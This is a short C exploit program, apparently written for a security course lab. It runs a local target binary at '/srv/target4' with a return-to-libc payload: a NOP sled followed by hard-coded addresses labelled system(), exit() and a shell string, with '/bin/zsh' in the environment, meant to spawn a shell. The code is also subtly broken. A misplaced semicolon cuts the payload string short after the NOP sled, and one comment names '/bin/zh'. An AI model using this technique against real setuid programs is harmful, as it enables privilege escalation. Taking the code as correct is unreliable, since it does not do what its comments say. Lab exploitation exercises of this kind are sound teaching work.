#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/srv/target4"

int main(void)
{
  char *args[3];
  char *env[2];

  args[0] = TARGET;
  args[1] = "\x90\x90\x90\x90\x90\x90\x90\x90"; //NOP SLED
            "\x60\x43\xe1\xf7" //Address of system()
            "\xc0\x6e\xe0\xf7" //Address of exit()
            "\x63\xf3\xf5\xf7"; //Address of /bin/zh
  args[2] = NULL;

  env[0] = "/bin/zsh";
  env[1] = NULL;

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}